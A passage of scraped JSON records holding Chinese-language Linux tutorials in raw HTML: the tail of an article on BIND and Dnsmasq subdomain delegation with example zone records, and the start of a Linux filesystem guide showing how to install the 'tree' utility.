id=\"crayon-5b4d7a47c37f6712170541-1\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-4\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018123456</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-9\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-11\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-12\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-13\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-14\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">second </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-15\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-16\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-17\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018234567</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-22\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-24\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-25\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f6712170541-26\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f6712170541-27\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p>接下来生成子域服务器上的轮询记录，方法和前面一样。现在你已经有了多个域名服务器来处理到你的子域的请求。再说一次，BIND 是很复杂的，做同一件事情它有多种方法，因此，给你留的家庭作业是找出适合你使用的最佳配置方法。</p>\n<p>在 Dnsmasq 中做子域委派很容易。在你的主域名服务器上的 <code>dnsmasq.conf</code> 文件中添加如下的行，去指向到子域的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47c37f9167670735\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver=/sub.example.com/172.16.1.20\r\nserver=/sub.example.com/172.16.1.21\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::20\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f9167670735-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f9167670735-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f9167670735-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47c37f9167670735-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47c37f9167670735-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f9167670735-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f9167670735-2\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f9167670735-3\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47c37f9167670735-4\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47c37f9167670735-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>然后在子域的域名服务器上的 <code>/etc/hosts</code> 中配置轮询。</p>\n<p>获取配置方法的详细内容和帮助，请参考这些资源：</p>\n<ul>\n<li><a href=\"http://www.thekelleys.org.uk/dnsmasq/doc.html\">Dnsmasq</a></li>\n<li><a href=\"http://shop.oreilly.com/product/9780596100575.do\">DNS and BIND, 5th Edition</a></li>\n</ul>\n<p>通过来自 Linux 基金会和 edX 的免费课程 <a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">“Linux 入门” </a> 学习更多 Linux 的知识。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114157\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114157votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114157\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Carla Shroder", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "Linux 文件系统详解", "createdate": "2018/07/02", "url": "http://blog.jobbole.com/114189/", "url_object_id": "b712fbfeffbfaff779433029fcdbb8d8", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/blog/learn/intro-to-linux/2018/4/linux-filesystem-explained\">Paul Brown</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9798-1.html\">Linux中国/amwps290</a>   </div><blockquote><p>这篇教程将帮你快速了解 Linux 文件系统。</p></blockquote>\n<p>早在 1996 年，在真正理解文件系统的结构之前，我就学会了如何在我崭新的 Linux 上安装软件。这是一个问题，但对程序来说不是大问题，因为即使我不知道实际的可执行文件在哪里，它们也会神奇地工作。问题在于文档。</p>\n<p>你知道，那时候，Linux 不是像今天这样直观、用户友好的系统。你必须读很多东西。你必须知道你的 CRT 显示器的扫描频率以及拨号调制解调器的噪音来龙去脉，以及其他数以百计的事情。 我很快就意识到我需要花一些时间来掌握目录的组织方式以及 <code>/etc</code>（不是用于“其它”文件），<code>/usr</code>（不是用于“用户”文件）和 <code>/bin</code> （不是“垃圾桶”）的意思。</p>\n<p>本教程将帮助你比我当时更快地了解这些。</p>\n<h3 id=\"toc_1\">结构</h3>\n<p>从终端窗口探索 Linux 文件系统是有道理的，这并不是因为作者是一个脾气暴躁的老人，并且对新孩子和他们漂亮的图形工具不以为然（尽管某些事实如此），而是因为终端，尽管只是文本界面，才是更好地显示 Linux 目录树结构的工具。</p>\n<p>事实上，帮助你了解这一切的、应该首先安装的第一个工具的名为：<code>tree</code>。如果你正在使用 Ubuntu 或 Debian ，你可以：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f95e426268581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f95e426268581-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f95e426268581-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f95e426268581-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f95e426268581-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 Red Hat 或 Fedora :</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f969666460663\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f969666460663-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f969666460663-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f969666460663-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f969666460663-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>对于 SUSE/openSUSE 可以使用 <code>zypper</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f96d445901221\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo zypper install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f96d445901221-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f96d445901221-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f96d445901221-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">zypper </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f96d445901221-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>对于使用 Arch （Manjaro，Antergos，等等）使用：</p><!-- Crayon Syntax Highlighter 